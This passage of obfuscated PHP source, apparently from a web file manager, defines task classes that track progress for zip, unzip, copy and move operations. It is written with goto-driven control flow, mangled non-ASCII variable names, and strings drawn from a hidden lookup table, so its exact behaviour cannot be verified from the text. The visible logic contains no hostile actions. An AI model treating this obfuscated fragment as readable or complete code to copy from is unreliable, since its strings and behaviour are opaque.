ò; Aººëá≠≤ò: $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1032]] = $b∑øß†ŒÔÙ[1603]; $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[1585]] = $b∑øß†ŒÔÙ[1102]; $E⁄Ω∑µƒ∫‰[$b∑øß†ŒÔÙ[742]] = $E¶À…Ñëæ[$b∑øß†ŒÔÙ[78]]; goto e€ëäÛ“ßâ; a…ãÕß† ò: } public function unzipAfter($D®ﬁ⁄˜ƒñƒ) { goto bîòôﬁâ◊Ö; f‹º≈ÂŸ‡º: $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1581]] = $Aƒ∆®ıãÆë[33]; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1588]] = 0; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[742]] = $Bà◊®î±´Á[$Aƒ∆®ıãÆë[78]]; goto AÛ’Ç°ö”ñ; AÛ’Ç°ö”ñ: $this->update(); self::log($Aƒ∆®ıãÆë[1629] . json_encode(array($FòÓ¢√é„¬, $Bà◊®î±´Á))); goto EäÓ…Ô ‚Û; bîòôﬁâ◊Ö: $Aƒ∆®ıãÆë =& $_SERVER[™⁄»üÆ]; $FòÓ¢√é„¬ =& $this->task; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1627]] = $Aƒ∆®ıãÆë[107]; goto Aò∂ÃŒ®–Ü; B†¬Ó‘‰ôï: $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1044]] = 0; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1583]] = 0; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1584]] = 0; goto f‹º≈ÂŸ‡º; AãªºÓÑÔ: if ($Bà◊®î±´Á[$Aƒ∆®ıãÆë[29]] == $Aƒ∆®ıãÆë[193]) { $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1030]] = 1; } else { $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1030]] = $Bà◊®î±´Á[$Aƒ∆®ıãÆë[81]][$Aƒ∆®ıãÆë[79]]; } $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1032]] = $Aƒ∆®ıãÆë[33]; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1585]] = 0; goto B†¬Ó‘‰ôï; Aò∂ÃŒ®–Ü: $Bà◊®î±´Á = IO::infoWithChildren($D®ﬁ⁄˜ƒñƒ); $aÇß∏åÃèê = 0; $FòÓ¢√é„¬[$Aƒ∆®ıãÆë[1592]] = array($Aƒ∆®ıãÆë[1593] => $aÇß∏åÃèê + 1, $Aƒ∆®ıãÆë[414] => $Bà◊®î±´Á[$Aƒ∆®ıãÆë[28]], $Aƒ∆®ıãÆë[76] => $Bà◊®î±´Á[$Aƒ∆®ıãÆë[76]], $Aƒ∆®ıãÆë[501] => $Bà◊®î±´Á[$Aƒ∆®ıãÆë[501]] ? $Bà◊®î±´Á[$Aƒ∆®ıãÆë[501]] : $Bà◊®î±´Á[$Aƒ∆®ıãÆë[76]]); goto AãªºÓÑÔ; EäÓ…Ô ‚Û: } public function nameParse($aâ®ÖôØº∂) { goto d˜Œ´ò ‰É; cŒÏß≤∏öÈ: $céÓéÉ„Øú = get_path_this($aâ®ÖôØº∂); if (strstr($céÓéÉ„Øú, $B°î≥é√îˆ[95])) { $fçÏí”ˆÍÒ[$B°î≥é√îˆ[1044]] += 1; $fçÏí”ˆÍÒ[$B°î≥é√îˆ[1030]] += 1; } $fçÏí”ˆÍÒ[$B°î≥é√îˆ[1581]] = $aâ®ÖôØº∂; goto b∑”è•◊‚ô; b∑”è•◊‚ô: $this->update(); goto b◊™˘§Îäã; d˜Œ´ò ‰É: $B°î≥é√îˆ =& $_SERVER[™⁄»üÆ]; $fçÏí”ˆÍÒ =& $this->task; if ($fçÏí”ˆÍÒ[$B°î≥é√îˆ[1627]] == $B°î≥é√îˆ[1102]) { $fçÏí”ˆÍÒ[$B°î≥é√îˆ[1627]] = $B°î≥é√îˆ[311]; $fçÏí”ˆÍÒ[$B°î≥é√îˆ[1588]] = 0; $fçÏí”ˆÍÒ[$B°î≥é√îˆ[742]] = 0; } goto cŒÏß≤∏öÈ; b◊™˘§Îäã: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Fë⁄≤ËÑ¶á =& $_SERVER[™⁄»üÆ]; parent::startAfter(); Hook::bind($Fë⁄≤ËÑ¶á[1630], array($this, $Fë⁄≤ËÑ¶á[1625])); $CÛÉπÏ∂«Û =& $this->task; $CÛÉπÏ∂«Û[$Fë⁄≤ËÑ¶á[1627]] = $Fë⁄≤ËÑ¶á[1102]; if (!$CÛÉπÏ∂«Û[$Fë⁄≤ËÑ¶á[1440]]) { $CÛÉπÏ∂«Û[$Fë⁄≤ËÑ¶á[1440]] = LNG($Fë⁄≤ËÑ¶á[1631]); } } protected function endAfter() { $AÑ«È·øúÊ =& $_SERVER[™⁄»üÆ]; parent::endAfter(); Hook::unbind($AÑ«È·øúÊ[1630], array($this, $AÑ«È·øúÊ[1625])); } public function updateAfter() { $EÍØ“ÿÙÜÓ =& $_SERVER[™⁄»üÆ]; $e€ÜØê÷Ï∏ =& $this->task; if (!$e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1030]] || !$e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[742]]) { return; } if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1627]] == $EÍØ“ÿÙÜÓ[1102]) { $dîèûæœ‚“ = $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1584]]; if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1585]] != $EÍØ“ÿÙÜÓ[1102]) { $dîèûæœ‚“ = 0; } $bø™†ÃÑí = ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1588]] + $dîèûæœ‚“) / $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[742]]; $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]] = $bø™†ÃÑí * 0.3; } else { if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1627]] == $EÍØ“ÿÙÜÓ[311]) { $bø™†ÃÑí = $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1044]] / $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1030]]; $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]] = 0.3 + $bø™†ÃÑí * 0.5; } else { if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1627]] == $EÍØ“ÿÙÜÓ[107]) { $bø™†ÃÑí = 0; if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1583]]) { $bø™†ÃÑí = $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1584]] / $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1583]]; } $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]] = 0.3 + 0.5 + $bø™†ÃÑí * 0.2; } } } if ($e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]] > 0) { $aØ˜©ÜË¶è = timeFloat() - $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[768]] - $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1541]]; $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1542]] = $aØ˜©ÜË¶è * (1 - $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]]) / $e€ÜØê÷Ï∏[$EÍØ“ÿÙÜÓ[1538]]; } } public function copyFileStart($F’à÷ £“–, $fûòΩ÷„’∫, $D≤ìªö∏öÉ, $eåñâéç‹á, $c¿ΩëêÉÉâ, $d·◊ Œ≤Ù˘) { $EùâŸÙâÖ≈ =& $_SERVER[™⁄»üÆ]; parent::copyFileStart($F’à÷ £“–, $fûòΩ÷„’∫, $D≤ìªö∏öÉ, $eåñâéç‹á, $c¿ΩëêÉÉâ, $d·◊ Œ≤Ù˘); $d¬ﬂ„¡î≠  =& $this->task; if ($d¬ﬂ„¡î≠ [$EùâŸÙâÖ≈[1627]] == $EùâŸÙâÖ≈[311]) { $d¬ﬂ„¡î≠ [$EùâŸÙâÖ≈[1627]] = $EùâŸÙâÖ≈[107]; } $this->update(); } public function copyFileEnd($aãÚ‚ñøëû, $DïâÏ¡åå , $cÁó®ﬂ«—ê, $Eãéı…öˆÏ, $a‘«Û‹¿åπ, $bÒ¥àÛŸ§™) { $B£ıÛÛÂëÓ =& $_SERVER[™⁄»üÆ]; $e∆ÚÀÇÓÊº =& $this->task; $e∆ÚÀÇÓÊº[$B£ıÛÛÂëÓ[1584]] = $e∆ÚÀÇÓÊº[$B£ıÛÛÂëÓ[1583]]; $e∆ÚÀÇÓÊº[$B£ıÛÛÂëÓ[1588]] += $e∆ÚÀÇÓÊº[$B£ıÛÛÂëÓ[1583]]; $e∆ÚÀÇÓÊº[$B£ıÛÛÂëÓ[1585]] = $B£ıÛÛÂëÓ[33]; $this->update(); } public function nameParse($BÓ‚àíŒÂ¿) { $A∆çœÒêá¢ =& $_SERVER[™⁄»üÆ]; $d«åÉ÷Éﬁƒ =& $this->task; if ($d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1044]] < $d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1030]]) { $b∑“ÚÆƒú» = get_path_this($BÓ‚àíŒÂ¿); if (strstr($b∑“ÚÆƒú», $A∆çœÒêá¢[95])) { $d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1044]] += 1; } } if ($d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1627]] == $A∆çœÒêá¢[1102]) { $d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1627]] = $A∆çœÒêá¢[311]; } $d«åÉ÷Éﬁƒ[$A∆çœÒêá¢[1581]] = $BÓ‚àíŒÂ¿; $this->update(); } } goto däÕ¯ûÒ•; DçŒ‘Ë≤ôë: class TaskFileTransfer extends Task { protected function startAfter() { goto bºØâª⁄≈è; C¢ºñ≥ÕíÜ: Hook::bind($bŸè÷·◊ì…[1575], array($this, $bŸè÷·◊ì…[1576])); Hook::bind($bŸè÷·◊ì…[1577], array($this, $bŸè÷·◊ì…[1578])); Hook::bind($bŸè÷·◊ì…[1579], array($this, $bŸè÷·◊ì…[1580])); goto b¡ à÷úÉœ; b¡ à÷úÉœ: $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1581]] = LNG($bŸè÷·◊ì…[1582]); $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1583]] = 0; $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1584]] = 0; goto Cª—ˆ ﬁ¢å; DÜÃà≈⁄¢⁄: Hook::bind($bŸè÷·◊ì…[1572], array($this, $bŸè÷·◊ì…[1573])); Hook::bind($bŸè÷·◊ì…[573], array($this, $bŸè÷·◊ì…[1574])); $this->sourceModelCopyFlag = !1; goto C¢ºñ≥ÕíÜ; B†√Ö±Ë˜ê: $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1587]] = 0; $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1588]] = 0; if (!$aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1440]]) { $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1440]] = LNG($bŸè÷·◊ì…[1589]); } goto fÁ”æ∆ˆ°Æ; bºØâª⁄≈è: $bŸè÷·◊ì… =& $_SERVER[™⁄»üÆ]; $aùãÇŒÊﬁ¯ =& $this->task; $this->sourceCopyFolder = !1; goto fø‰ãäé¯Á; fø‰ãäé¯Á: Hook::bind($bŸè÷·◊ì…[1563], array($this, $bŸè÷·◊ì…[1564])); Hook::bind($bŸè÷·◊ì…[1118], array($this, $bŸè÷·◊ì…[1565])); Hook::bind($bŸè÷·◊ì…[1566], array($this, $bŸè÷·◊ì…[1567])); goto còÍ˘ÍõÑÛ; còÍ˘ÍõÑÛ: Hook::bind($bŸè÷·◊ì…[580], array($this, $bŸè÷·◊ì…[1568])); Hook::bind($bŸè÷·◊ì…[581], array($this, $bŸè÷·◊ì…[1569])); Hook::bind($bŸè÷·◊ì…[583], array($this, $bŸè÷·◊ì…[1570])); goto FÑ—éì…ƒé; C‹∫œ∫ïÏ«: Hook::bind($bŸè÷·◊ì…[553], array($this, $bŸè÷·◊ì…[1571])); Hook::bind($bŸè÷·◊ì…[555], array($this, $bŸè÷·◊ì…[1571])); Hook::bind($bŸè÷·◊ì…[557], array($this, $bŸè÷·◊ì…[1571])); goto DÜÃà≈⁄¢⁄; FÑ—éì…ƒé: Hook::bind($bŸè÷·◊ì…[584], array($this, $bŸè÷·◊ì…[1570])); Hook::bind($bŸè÷·◊ì…[551], array($this, $bŸè÷·◊ì…[1571])); Hook::bind($bŸè÷·◊ì…[548], array($this, $bŸè÷·◊ì…[1571])); goto C‹∫œ∫ïÏ«; Cª—ˆ ﬁ¢å: $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1032]] = $bŸè÷·◊ì…[33]; $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1585]] = $bŸè÷·◊ì…[33]; $aùãÇŒÊﬁ¯[$bŸè÷·◊ì…[1586]] = 0; goto B†√Ö±Ë˜ê; fÁ”æ∆ˆ°Æ: } protected function endAfter() { goto Cœ€ãÎ◊≈±; aº≤æÜ·íâ: Hook::unbind($b¶∞¡¥µÏ≥[557], array($this, $b¶∞¡¥µÏ≥[1571])); Hook::unbind($b¶∞¡¥µÏ≥[1572], array($this, $b¶∞¡¥µÏ≥[1573])); Hook::unbind($b¶∞¡¥µÏ≥[573], array($this, $b¶∞¡¥µÏ≥[1574])); goto d—ø≠´±íè; Cœ€ãÎ◊≈±: $b¶∞¡¥µÏ≥ =& $_SERVER[™⁄»üÆ]; Hook::unbind($b¶∞¡¥µÏ≥[1563], array($this, $b¶∞¡¥µÏ≥[1564])); Hook::unbind($b¶∞¡¥µÏ≥[1118], array($this, $b¶∞¡¥µÏ≥[1565])); goto Aâ£”Íé›ó; A ÜÎØÖà¯: Hook::unbind($b¶∞¡¥µÏ≥[548], array($this, $b¶∞¡¥µÏ≥[1571])); Hook::unbind($b¶∞¡¥µÏ≥[553], array($this, $b¶∞¡¥µÏ≥[1571])); Hook::unbind($b¶∞¡¥µÏ≥[555], array($this, $b¶∞¡¥µÏ≥[1571])); goto aº≤æÜ·íâ; d—ø≠´±íè: Hook::unbind($b¶∞¡¥µÏ≥[1575], array($this, $b¶∞¡¥µÏ≥[1576])); Hook::unbind($b¶∞¡¥µÏ≥[1577], array($this, $b¶∞¡¥µÏ≥[1578])); Hook::unbind($b¶∞¡¥µÏ≥[1579], array($this, $b¶∞¡¥µÏ≥[1580])); goto Eø®æ€õ€à; DÒÇ™É®…Ñ: Hook::unbind($b¶∞¡¥µÏ≥[583], array($this, $b¶∞¡¥µÏ≥[1570])); Hook::unbind($b¶∞¡¥µÏ≥[584], array($this, $b¶∞¡¥µÏ≥[1570])); Hook::unbind($b¶∞¡¥µÏ≥[551], array($this, $b¶∞¡¥µÏ≥[1571])); goto A ÜÎØÖà¯; Aâ£”Íé›ó: Hook::unbind($b¶∞¡¥µÏ≥[1566], array($this, $b¶∞¡¥µÏ≥[1567])); Hook::unbind($b¶∞¡¥µÏ≥[580], array($this, $b¶∞¡¥µÏ≥[1568])); Hook::unbind($b¶∞¡¥µÏ≥[581], array($this, $b¶∞¡¥µÏ≥[1569])); goto DÒÇ™É®…Ñ; Eø®æ€õ€à: } public function copyMoveStart($d‹ŸßÕƒÑ®, $b˘çﬁÜ‚Ï¡, $AÃ…ü›êÕ≈, $F·ëÊé§Ìã) { goto e«ÖÒ¬Í∂≈; dìÜå€âéü: if (substr($b˘çﬁÜ‚Ï¡, 0, strlen($bò≥æá°ƒ‘)) == $bò≥æá°ƒ‘) { return; } if (substr($F·ëÊé§Ìã, 0, strlen($bò≥æá°ƒ‘)) == $bò≥æá°ƒ‘) { return; } $e˜¥¢Ω·ÍÚ =& $this->task; goto fœ–“äøÊâ; e«ÖÒ¬Í∂≈: $C¢Ç¡’ƒ–€ =& $_SERVER[™⁄»üÆ]; self::log($C¢Ç¡’ƒ–€[1590] . $b˘çﬁÜ‚Ï¡ . $C¢Ç¡’ƒ–€[67] . $F·ëÊé§Ìã); $bò≥æá°ƒ‘ = rtrim(TEMP_FILES, $C¢Ç¡’ƒ–€[8]); goto dìÜå€âéü; fœ–“äøÊâ: $e˜¥¢Ω·ÍÚ[$C¢Ç¡’ƒ–€[1591]] = KodIO::transferType($d‹ŸßÕƒÑ®, $AÃ…ü›êÕ≈); $this->update(); goto E»Ã∫¶—∑Ó; E»Ã∫¶—∑Ó: } public function updateAfter() { $bÏ∫ÑÏëõË =& $_SERVER[™⁄»üÆ]; $béüºùâöø =& $this->task; if (!$béüºùâöø[$bÏ∫ÑÏëõË[742]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($béüºùâöø[$bÏ∫ÑÏëõË[1591]] == $bÏ∫ÑÏëõË[1191]) { return; } self::updateTask($béüºùâöø); } private static function updateTask(&$eè ÜË•©å) { $c±ú°•à∑ =& $_SERVER[™⁄»üÆ]; if ($eè ÜË•©å[$c±ú°•à∑[1591]] == $c±ú°•à∑[1102] || $eè ÜË•©å[$c±ú°•à∑[1591]] == $c±ú°•à∑[107]) { if ($eè ÜË•©å[$c±ú°•à∑[1585]]) { $eè ÜË•©å[$c±ú°•à∑[1588]] = $eè ÜË•©å[$c±ú°•à∑[1587]] + $eè ÜË•©å[$c±ú°•à∑[1584]]; } } else { if ($eè ÜË•©å[$c±ú°•à∑[1591]] == $c±ú°•à∑[1192]) { if ($eè ÜË•©å[$c±ú°•à∑[1585]] == $c±ú°•à∑[1102]) { $eè ÜË•©å[$c±ú°•à∑[1588]] = $eè ÜË•©å[$c±ú°•à∑[1587]] + $eè ÜË•©å[$c±ú°•à∑[1584]] * 0.5; } else { if ($eè ÜË•©å[$c±ú°•à∑[1585]] == $c±ú°•à∑[107]) { $eè ÜË•©å[$c±ú°•à∑[1588]] = $eè ÜË•©å[$c±ú°•à∑[1587]] + $eè ÜË•©å[$c±ú°•à∑[1583]] * 0.5 + $eè ÜË•©å[$c±ú°•à∑[1584]] * 0.5; } } } } $eè ÜË•©å[$c±ú°•à∑[1538]] = $eè ÜË•©å[$c±ú°•à∑[1588]] / $eè ÜË•©å[$c±ú°•à∑[742]]; if ($eè ÜË•©å[$c±ú°•à∑[1538]] > 0) { $dõ¥ëÿÇ”¬ = timeFloat() - $eè ÜË•©å[$c±ú°•à∑[768]] - $eè ÜË•©å[$c±ú°•à∑[1541]]; $eè ÜË•©å[$c±ú°•à∑[1542]] = $dõ¥ëÿÇ”¬ * (1 - $eè ÜË•©å[$c±ú°•à∑[1538]]) / $eè ÜË•©å[$c±ú°•à∑[1538]]; } } public function addPath($c—¡úéª§Ω) { goto bÆÑ‘£ÏÓÀ; bÆÑ‘£ÏÓÀ: $bªÚ¡¯£ÂÜ =& $_SERVER[™⁄»üÆ]; if (!$c—¡úéª§Ω) { return; } $cŒí…ÏÓ»Î =& $this->task; goto b®ÑıÀÊ¡‡; b®ÑıÀÊ¡‡: $DÔÉêŒ¯“‹ = IO::infoWithChildren($c—¡úéª§Ω); $cã·£ªÑ÷⁄ = $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1592]] ? $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1592]][$bªÚ¡¯£ÂÜ[1593]] : 0; $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1592]] = array($bªÚ¡¯£ÂÜ[1593] => $cã·£ªÑ÷⁄ + 1, $bªÚ¡¯£ÂÜ[414] => $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[28]], $bªÚ¡¯£ÂÜ[76] => $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[76]], $bªÚ¡¯£ÂÜ[501] => $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[501]] ? $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[501]] : $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[76]]); goto B∆ÓÕÌ·⁄¨; B∆ÓÕÌ·⁄¨: if ($DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[29]] == $bªÚ¡¯£ÂÜ[193]) { $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1030]] += 1; } else { $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1030]] += $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[81]][$bªÚ¡¯£ÂÜ[79]]; if ($DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[396]]) { $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[1030]] += $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[81]][$bªÚ¡¯£ÂÜ[80]] + 1; } } $cŒí…ÏÓ»Î[$bªÚ¡¯£ÂÜ[742]] += $DÔÉêŒ¯“‹[$bªÚ¡¯£ÂÜ[78]]; $this->update(); goto D≤ßÏá»ﬁÃ; D≤ßÏá»ﬁÃ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($BÒ…çæ£¿≤) { $A¨Ω©Îï”Ò =& $_SERVER[™⁄»üÆ]; $f”Œ∆¿Ÿ–≤ =& $this->task; $f”Œ∆¿Ÿ–≤[$A¨Ω©Îï”Ò[1581]] = $BÒ…çæ£¿≤[$A¨Ω©Îï”Ò[28]]; $f”Œ∆¿Ÿ–≤[$A¨Ω©Îï”Ò[1032]] = $BÒ…çæ£¿≤[$A¨Ω©Îï”Ò[28]]; $this->update(); } public function copyFileStart($Còû‹üê––, $d¿∏·—ÉÆ¡, $bÉÊ”ä•™ì, $DÑ§ÓÔáÇÎ, $CÖ◊é·ÍØ÷, $a“˘Öá‚±‡) { goto båÒØû∆Ùº; eù‡á¡ÍÜ: $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1032]] = $Dëÿ§¿∫Âå[33]; $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1585]] = $Dëÿ§¿∫Âå[33]; $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1586]] = 0; goto fˆ∫„è„πå; fˆ∫„è„πå: $fäË¬ˆ—Ñ’ = $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1583]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($aø™Â„‘¬◊[$Dëÿ§¿∫Âå[394]] . $Dëÿ§¿∫Âå[1596]); if ($fäË¬ˆ—Ñ’ && file_exists(get_path_father($DÑ§ÓÔáÇÎ))) { Cache::set($aø™Â„‘¬◊[$Dëÿ§¿∫Âå[394]] . $Dëÿ§¿∫Âå[1596], $DÑ§ÓÔáÇÎ); $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1556]] = array($Dëÿ§¿∫Âå[1597], $Dëÿ§¿∫Âå[1598]); } goto C™ù†ÌÔÃó; FÆ…‘»»ÿÁ: $GLOBALS[$Dëÿ§¿∫Âå[1595]] = $CÖ◊é·ÍØ÷; $GLOBALS[$Dëÿ§¿∫Âå[1594]] = $a“˘Öá‚±‡; $aø™Â„‘¬◊ =& $this->task; goto cÕÿæ¬∆æÉ; cÕÿæ¬∆æÉ: $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1581]] = $CËùÎ˘°â•; $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1583]] = (int) $Còû‹üê––->size($d¿∏·—ÉÆ¡); $aø™Â„‘¬◊[$Dëÿ§¿∫Âå[1584]] = 0; goto eù‡á¡ÍÜ; C™ù†ÌÔÃó: $this->update(0, $fäË¬ˆ—Ñ’); goto A«”Ìè‘®‡; båÒØû∆Ùº: $Dëÿ§¿∫Âå =& $_SERVER[™⁄»üÆ]; $CËùÎ˘°â• = $CÖ◊é·ÍØ÷; if ($CËùÎ˘°â• == $GLOBALS[$Dëÿ§¿∫Âå[1594]]) { $CËùÎ˘°â• = $GLOBALS[$Dëÿ§¿∫Âå[1595]]; } goto FÆ…‘»»ÿÁ; A«”Ìè‘®‡: } public static function updateCopyLocalFileSize($EÍ‰éã∫ë·) { goto F—…´ùé∏…; aŸÆÊ»Ã»º: return $EÍ‰éã∫ë·; goto B‚È– øÜ°; F—…´ùé∏…: $cåïçò∑å¶ =& $_SERVER[™⁄»üÆ]; $DÍ„ÜƒÑﬁ• = Cache::get($EÍ‰éã∫ë·[$cåïçò∑å¶[394]] . $cåïçò∑å¶[1596]); if (!$DÍ„ÜƒÑﬁ• || !file_exists($DÍ„ÜƒÑﬁ•)) { return $EÍ‰éã∫ë·; } goto f‡àŸä‚Œœ; f‡àŸä‚Œœ: $EÍ‰éã∫ë·[$cåïçò∑å¶[1584]] = @filesize($DÍ„ÜƒÑﬁ•); $EÍ‰éã∫ë·[$cåïçò∑å¶[1588]] += $EÍ‰éã∫ë·[$cåïçò∑å¶[1584]]; self::updateTask($EÍ‰éã∫ë·); goto aŸÆÊ»Ã»º; B‚È– øÜ°: } public function copyFileEnd($d„ΩåÓ“‹¿, $dô¶å“’‰ß, $E„Ê…∫Öõ–, $D¨’ô©‡¯Ì, $EÔ∞ÁÜÖ†», $eÖÌØçî«¯) { goto d∑Ô√¨ùïû; FÂÙÂÎ«≠ú: $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1585]] = $Cæ˜ÎﬁÒÜü[33]; unset($CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1556]]); if ($EÔ∞ÁÜÖ†» == $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1581]]) { $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1587]] += $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1583]]; $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1588]] = $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1587]]; $this->update(1); } else { $this->update(); $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1584]] = 0; } goto B≈Í€Ç‡∆Ñ; B≈Í€Ç‡∆Ñ: Cache::remove($CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[394]] . $Cæ˜ÎﬁÒÜü[1596]); self::log($Cæ˜ÎﬁÒÜü[1599] . $dô¶å“’‰ß . $Cæ˜ÎﬁÒÜü[67] . $D¨’ô©‡¯Ì . $Cæ˜ÎﬁÒÜü[229] . $EÔ∞ÁÜÖ†» . $Cæ˜ÎﬁÒÜü[1600] . $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1581]]); goto báﬂ“Áä⁄©; d∑Ô√¨ùïû: $Cæ˜ÎﬁÒÜü =& $_SERVER[™⁄»üÆ]; $CÔ°¬›„• =& $this->task; $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1584]] = $CÔ°¬›„•[$Cæ˜ÎﬁÒÜü[1583]]; goto FÂÙÂÎ«≠ú; báﬂ“Áä⁄©: } public function updateFileEnd($Eˆ¿ﬂË’äå, $d”æµâ÷‰Ì) { goto e‘ë∑¿öê; e‘ë∑¿öê: $d∆ƒµﬁËçº =& $_SERVER[™⁄»üÆ]; $e®îäàŸö∏ =& $this->task; $e®îäàŸö∏[$d∆ƒµﬁËçº[1581]] = $Eˆ¿ﬂË’äå; goto F¨¶≥Â§ëÜ; B∞Î´Íà®…: $this->update(1); self::log($d∆ƒµﬁËçº[1601] . $Eˆ¿ﬂË’äå); goto Aâ√ÈÜáèÊ; F¨¶≥Â§ëÜ: $e®îäàŸö∏[$d∆ƒµﬁËçº[1583]] = $d”æµâ÷‰Ì; $e®îäàŸö∏[$d∆ƒµﬁËçº[1587]] += $d”æµâ÷‰Ì; $e®îäàŸö∏[$d∆ƒµﬁËçº[1588]] = $e®îäàŸö∏[$d∆ƒµﬁËçº[1587]]; goto B∞Î´Íà®…; Aâ√ÈÜáèÊ: } public function sourceModelCopy($B≥À§≥—ä‰) { goto BËÆÎâò·’; aîÇöÇ‰Èñ: switch ($Béî¬ùåππ) { case $aêÂ™à˘≤[549]: $Bì‰üÑ·íà = 1; break; case $aêÂ™à˘≤[552]: $F∞ﬂ£ÖÀ¢¬[$aêÂ™à˘≤[1581]] = $F®Ìıï›˜õ[$aêÂ™à˘≤[28]]; break; case $aêÂ™à˘≤[554]: $Bì‰üÑ·íà = intval($B≥À§≥—ä‰[$aêÂ™à˘≤[377]] * 0.4); break; case $aêÂ™à˘≤[556]: $Bì‰üÑ·íà = intval($B≥À§≥—ä‰[$aêÂ™à˘≤[377]] * 0.2); break; case $aêÂ™à˘≤[558]: $Bì‰üÑ·íà = intval($B≥À§≥—ä‰[$aêÂ™à˘≤[377]] * 0.4); break; } $this->update($Bì‰üÑ·íà); $this->sourceModelCopyFlag = !1; goto D‘¥îëıëâ; f≠°ü¥“°ë: $F∞ﬂ£ÖÀ¢¬ =& $this->task; $this->sourceModelCopyFlag = !0; $Bì‰üÑ·íà = 0; goto aîÇöÇ‰Èñ; BËÆÎâò·’: $aêÂ™à˘≤ =& $_SERVER[™⁄»üÆ]; $Béî¬ùåππ = $B≥À§≥—ä‰[0]; $F®Ìıï›˜õ = $B≥À§≥—ä‰[1]; goto f≠°ü¥“°ë; D‘¥îëıëâ: } public function sourceRemove($FµåıÌ‡∞™, $fÈ⁄ÁÖΩ”≈) { $Bπ£ÇƒµçÎ =& $_SERVER[™⁄»üÆ]; $this->sourceModelCopyFlag = !0; $f—ò÷ú¬Üã = 1; if (isset($FµåıÌ‡∞™[$Bπ£ÇƒµçÎ[81]])) { $f—ò÷ú¬Üã = 